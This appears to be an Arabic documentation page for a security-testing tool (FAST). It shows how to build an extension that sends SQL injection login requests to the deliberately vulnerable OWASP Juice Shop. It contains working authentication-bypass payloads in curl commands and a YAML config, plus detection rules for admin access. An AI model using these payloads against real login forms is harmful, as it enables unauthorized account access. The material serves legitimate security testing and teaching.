[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md#working-with-the-host-header
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project

# إنشاء امتداد غير تعديلي

لن يقوم الامتداد الموصوف في هذا المستند بتعديل طلب أساسي وارد لحقن بعض البيانات فيه. بدلاً من ذلك، سيتم إرسال طلبين اختباريين محددين مسبقًا إلى المضيف الذي يتم تحديده في الطلب الأساسي. تحتوي هذه الطلبات الاختبارية على بيانات قد تؤدي إلى استغلال ثغرة SQLi في نموذج تسجيل دخول تطبيق الهدف ["OWASP Juice Shop"][link-juice-shop].

## الاستعدادات

يُنصح بشدة ب[التحقيق في سلوك تطبيق الهدف][link-app-examination] قبل إنشاء امتداد FAST.

## بناء الامتداد

أنشئ ملفًا يصف الامتداد (مثل، `non-mod-extension.yaml`)، واملأه بالأقسام المطلوبة:

1. [**قسم `meta-info`**][link-meta-info].

    إعداد وصف الثغرة التي سيحاول الامتداد كشفها.
    
    * عنوان الثغرة: `OWASP Juice Shop SQLi (امتداد غير تعديلي)`
    * وصف الثغرة: `عرض لثغرة SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)`
    * نوع الثغرة: حقن SQL
    * مستوى تهديد الثغرة: مرتفع
    
    ينبغي أن يبدو قسم `meta-info` المقابل كما يلي:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (امتداد غير تعديلي)'
      - description: 'عرض لثغرة SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)'
    ```
    
2. **قسم `send`، مرحلة [الإرسال][doc-send-phase]**

    هناك قيمتان يجب إرسالهما كقيم للمعلمة `email` إلى جانب أي قيمة للمعلمة `password` من أجل استغلال ثغرة حقن SQL في تطبيق الهدف:
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    يمكنك صياغة طلبين اختباريين، كل منهما يحتوي
    
    * على المعلمة `email` مع إحدى القيم الموصوفة أعلاه، و
    * المعلمة `password` بقيمة اعتباطية.

    يكفي استخدام أحد هذه الطلبات لاختبار تطبيق الهدف الخاص بنا (OWASP Juice Shop).
    
    ومع ذلك، قد يكون وجود مجموعة من الطلبات الاختبارية المعدة مسبقًا مفيدًا عند إجراء اختبارات الأمان لتطبيق حقيقي: إذا لم يعد أحد الطلبات قادرًا على استغلال ثغرة بفضل التحديثات والتحسينات في التطبيق، فستكون هناك طلبات اختبارية أخرى متاحة قد تستغل الثغرة بسبب استخدام بيانات أخرى.

    يشبه الطلب الأول بالبيانات المذكورة أعلاه هذا الطلب:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    يبدو الطلب الثاني مشابهًا للأول:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    أضف قسم `send` الذي يحتوي على وصف لهذين الطلبين الاختباريين:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "ملاحظة حول رأس `Host`"
        يمكن الاستغناء عن رأس `Host` في هذه الطلبات لأنه لا يؤثر على استغلال هذه الثغرة المعينة في SQLi. سيقوم عقد FAST تلقائيًا بإضافة رأس `Host` المستخرج من طلبات أساسية واردة.
        
        اقرأ [هنا][link-send-headers] حول كيفية التعامل مع رؤوس الطلب في مرحلة الإرسال.

     3.  **قسم `detect`، مرحلة [الكشف][doc-detect-phase]**.
    
    تشير الشروط التالية إلى أن توثيق المستخدم بحقوق المسؤول كان ناجحًا:
    
    * وجود معلمة تعريف سلة الشراء بقيمة `1` في جسم الاستجابة. المعلمة بتنسيق JSON وينبغي أن تبدو كما يلي:
    
        ```
        "bid":1
        ```
    
    * وجود معلمة البريد الإلكتروني للمستخدم بقيمة `admin@juice-sh.op` في جسم الاستجابة. المعلمة بتنسيق JSON وينبغي أن تظهر كما يلي:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    أضف قسم `detect` الذي يتحقق مما إذا كان الهجوم ناجحًا وفقًا للشروط الموصوفة أعلاه.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "هروب الرموز الخاصة"
    تذكر أن تهرب الرموز الخاصة في السلاسل.

## ملف الامتداد

الآن يحتوي ملف `non-mod-extension.yaml` على مجموعة كاملة من الأقسام المطلوبة لتشغيل الامتداد. قائمة محتويات الملف معروضة أدناه:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (امتداد غير تعديلي)'
      - description: 'عرض لثغرة SQLi في OWASP Juice Shop (تسجيل دخول الإدارة)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

## استخدام الامتداد

للحصول على معلومات مفصلة حول كيفية استخدام الامتداد المنشأ، اقرأ [هذا المستند][link-using-extension].